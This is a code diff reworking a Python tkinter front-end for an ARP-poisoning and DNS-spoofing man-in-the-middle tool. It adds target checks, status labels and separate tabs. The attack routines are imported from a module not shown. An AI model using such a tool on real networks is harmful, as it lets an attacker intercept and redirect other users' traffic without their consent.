@@ -1,8 +1,7 @@
 import tkinter as tk
-from scapy.all import *
 import tkinter.ttk as ttk
+from scapy.all import *
 from scapy_functions import *
-import threading
 from multiprocessing import Process
 
 ''' Global variables '''
@@ -14,6 +13,8 @@ target_2 = ""
 redirect_ip = ""
 process_arp_poisoner = Process()
 process_dns_poisoner = Process()
+arp_poisoned = False
+dns_spoofed = False
 
 
 ''' Functions '''
@@ -51,28 +52,70 @@ def add_target_2():
     tk.messagebox.showinfo(title = "Target selection", message = message)
 
 def arp_spoofing():
-    global process_arp_poisoner
+    global target_1, target_2
+
+    if (target_1 == "" or target_2 == ""):
+        message = "No targets have been selected!"
+        tk.messagebox.showerror(title = "ARP poisoning", message = message)
+        return
+
+    global process_arp_poisoner, arp_poisoned
     process_arp_poisoner = Process(target=poison_arp_cache, args=(target_1, target_2))
     process_arp_poisoner.start()
-    message = "ARP spoofing successful!"
-    tk.messagebox.showinfo(title = "ARP spoofing", message = message)
+    arp_poisoned = True
+    lbl_status_arp.config(text = "Status: ARP tables poisoned!")
+    message = "ARP poisoning successful!"
+    tk.messagebox.showinfo(title = "ARP poisoning", message = message)
 
 def arp_stop():
+    global arp_poisoned
+
+    if (arp_poisoned == False):
+        message = "ARP tables are not poisoned yet!"
+        tk.messagebox.showwarning(title = "ARP poisoning", message = message)
+        return
+
     process_arp_poisoner.terminate()
     restore_arp_table(target_1, target_2)
     restore_arp_table(target_2, target_1)
-    message = "ARP spoofing stopped!"
-    tk.messagebox.showinfo(title = "ARP spoofing", message = message)
+    arp_poisoned = False
+    lbl_status_arp.config(text = "Status: Not poisoned")
+    message = "ARP spoofing stopped and ARP tabels restored!"
+    tk.messagebox.showinfo(title = "ARP poisoning", message = message)
 
 def dns_spoofing():
-    global process_dns_poisoner
+    global arp_poisoned
+
+    if (arp_poisoned == False):
+        message = "You are not MITM!"
+        tk.messagebox.showerror(title = "DNS spoofing", message = message)
+        return
+
+    if (redirect_ip == ""):
+        message = "No redirect server has been inserted!"
+        tk.messagebox.showerror(title = "DNS spoofing", message = message)
+        return
+
+    global process_dns_poisoner, dns_spoofed
     process_dns_poisoner = Process(target=dns_sniffer, args=(target_1, target_2, redirect_ip))
     process_dns_poisoner.start()
+    dns_spoofed = True
+    status = "Status: DNS packets spoofed to " + redirect_ip
+    lbl_status_dns.config(text = status)
     message = "DNS spoofing successful!"
     tk.messagebox.showinfo(title = "DNS spoofing", message = message)
 
 def dns_stop():
+    global dns_spoofed
+
+    if (dns_spoofed == False):
+        message = "DNS packets are not spoofed yet!"
+        tk.messagebox.showwarning(title = "DNS spoofing", message = message)
+        return
+
     process_dns_poisoner.terminate()
+    dns_spoofed = False
+    lbl_status_dns.config(text = "Status: Not spoofed")
     message = "DNS spoofing stopped!"
     tk.messagebox.showinfo(title = "DNS spoofing", message = message)
 
@@ -99,12 +142,14 @@ tabControl = ttk.Notebook(window)
 tab_interface = tk.Frame(tabControl)
 tab_hosts = tk.Frame(tabControl)
 tab_targets = tk.Frame(tabControl)
-tab_attacks = tk.Frame(tabControl)
+tab_arp = tk.Frame(tabControl)
+tab_dns = tk.Frame(tabControl)
 
 tabControl.add(tab_interface, text = "Interface")
 tabControl.add(tab_hosts, text = "Hosts")
 tabControl.add(tab_targets, text = "Targets")
-tabControl.add(tab_attacks, text = "Attacks")
+tabControl.add(tab_arp, text = "ARP poison")
+tabControl.add(tab_dns, text = "DNS spoof")
 tabControl.pack(expand = 1, fill = "both")
 
 ''' Interface tab '''
@@ -169,27 +214,44 @@ fr_target_1.place(relx = 0.25, rely = 0.1, anchor = "c")
 fr_target_2.place(relx = 0.7, rely = 0.1, anchor = "c")
 
 
-''' Attacks tab '''
+''' ARP poison tab '''
 
-fr_attack_btns = tk.Frame(tab_attacks)
+fr_arp = tk.Frame(tab_arp)
 
-btn_arp_spoof = ttk.Button(fr_attack_btns, text = "Start ARP spoofing", command = arp_spoofing)
-btn_arp_spoof.grid(column = 0, row = 0)
+lbl_status_arp = ttk.Label(fr_arp, text = "Status: Not poisoned", font=("Courier", 18))
+lbl_status_arp.grid(column = 0, row = 0)
 
-btn_arp_stop = ttk.Button(fr_attack_btns, text = "Stop ARP spoofing", command = arp_stop)
-btn_arp_stop.grid(column = 1, row = 0)
+btn_arp_spoof = ttk.Button(fr_arp, text = "Start ARP table poisoning", command = arp_spoofing)
+btn_arp_spoof.grid(column = 0, row = 1, pady = 10)
 
-btn_dns_spoof = ttk.Button(fr_attack_btns, text = "Start DNS spoofing", command = dns_spoofing)
-btn_dns_spoof.grid(column = 0, row = 1)
+btn_arp_stop = ttk.Button(fr_arp, text = "Stop ARP poisoning", command = arp_stop)
+btn_arp_stop.grid(column = 0, row = 2)
 
-btn_dns_stop = ttk.Button(fr_attack_btns, text = "Stop DNS spoofing", command = dns_stop)
-btn_dns_stop.grid(column = 1, row = 1)
+fr_arp.place(relx = 0.5, rely = 0.5, anchor = "c")
 
-ent_dns_redirect = ttk.Entry(fr_attack_btns)
+
+
+''' DNS spoof tab '''
+
+fr_dns = tk.Frame(tab_dns)
+
+lbl_status_dns = ttk.Label(fr_dns, text = "Status: Not spoofed", font=("Courier", 18))
+lbl_status_dns.grid(column = 0, row = 0, pady = 10)
+
+lbl_redirect_ip = ttk.Label(fr_dns, text = "Insert redirect IP: ")
+lbl_redirect_ip.grid(column = 0, row = 1)
+
+ent_dns_redirect = ttk.Entry(fr_dns)
 ent_dns_redirect.bind("<Return>", set_redirect_ip)
-ent_dns_redirect.grid(column = 2, row = 1)
+ent_dns_redirect.grid(column = 0, row = 2)
 
-fr_attack_btns.place(relx = 0.5, rely = 0.05, anchor = "c")
+btn_dns_spoof = ttk.Button(fr_dns, text = "Start DNS spoofing", command = dns_spoofing)
+btn_dns_spoof.grid(column = 0, row = 3, pady = 10)
+
+btn_dns_stop = ttk.Button(fr_dns, text = "Stop DNS spoofing", command = dns_stop)
+btn_dns_stop.grid(column = 0, row = 4)
+
+fr_dns.place(relx = 0.5, rely = 0.5, anchor = "c")
 
 
 
